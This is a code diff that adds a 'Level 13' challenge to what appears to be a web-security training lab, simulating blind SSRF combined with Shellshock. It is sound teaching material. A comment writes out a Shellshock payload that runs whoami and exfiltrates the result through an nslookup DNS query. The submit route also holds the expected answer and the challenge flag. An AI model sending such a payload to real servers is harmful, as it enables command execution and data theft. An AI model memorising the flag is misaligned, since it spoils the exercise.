@@ -49,6 +49,8 @@ ORDERS_DB = {
     },
     "9999": {"user": "admin", "item": "Enterprise Server Cluster", "price": "25,000.00$", "status": "Delivered", "address": "Secure Data Center"},
 }
+# --- LEVEL 13 DATA ---
+LEVEL_13_INTERACTIONS = {}
 
 
 @bp.get("/")
@@ -382,3 +384,59 @@ def l12_analytics():
         return jsonify({"status": "success", "message": "Analytics tracking initiated in background."})
     return jsonify({"status": "error", "message": "Invalid tracking endpoint."}), 400
 
+
+
+# --- LEVEL 13 (Blind SSRF with Shellshock - Expert) ---
+@bp.get("/level-13")
+def level_13():
+    return render_template("level_13/index.html")
+
+
+@bp.get("/level-13/product/<int:product_id>")
+def l13_product(product_id: int):
+    # This simulates the "analytics software" fetching the Referer
+    referer = request.headers.get("Referer", "")
+    user_agent = request.headers.get("User-Agent", "")
+
+    # Target internal network range: 192.168.0.X:8080
+    if "192.168.0." in referer and ":8080" in referer:
+        # Check for Shellshock payload
+        # Format: () { :; }; /usr/bin/nslookup $(whoami).SUBDOMAIN
+        if "() { :; };" in user_agent and "nslookup" in user_agent:
+            try:
+                # Simple extraction of subdomain
+                parts = user_agent.split("nslookup")[1].strip().split(" ")[0]
+                # Assuming $(whoami).SUBDOMAIN
+                subdomain = parts.split(".")[-3] if "." in parts else parts
+                if "$" in parts:
+                    subdomain = parts.split(".")[-1]
+                
+                # Record the "DNS interaction"
+                # Simulated OS user is 'peter-ssrf-shellshock'
+                interaction = {
+                    "type": "DNS",
+                    "query": f"peter-ssrf-shellshock.{subdomain}",
+                    "time": "Just now"
+                }
+                if subdomain not in LEVEL_13_INTERACTIONS:
+                    LEVEL_13_INTERACTIONS[subdomain] = []
+                LEVEL_13_INTERACTIONS[subdomain].append(interaction)
+                print(f"[SHELLSHOCK LOG] Interaction recorded for {subdomain}")
+            except Exception as e:
+                print(f"[SHELLSHOCK ERROR] Failed to parse payload: {e}")
+
+    return render_template("level_13/product.html", product_id=product_id)
+
+
+@bp.get("/level-13/api/poll/<subdomain>")
+def l13_poll(subdomain: str):
+    interactions = LEVEL_13_INTERACTIONS.get(subdomain, [])
+    return jsonify({"interactions": interactions})
+
+
+@bp.post("/level-13/submit")
+def l13_submit():
+    answer = request.form.get("answer", "").strip()
+    if answer == "peter-ssrf-shellshock":
+        return jsonify({"status": "success", "message": "Congratulations! You exfiltrated the OS user name. FLAG{SSRF_SHELLSHOCK_DNS_EXFIL_MASTER}"})
+    return jsonify({"status": "error", "message": "Incorrect OS user name."})
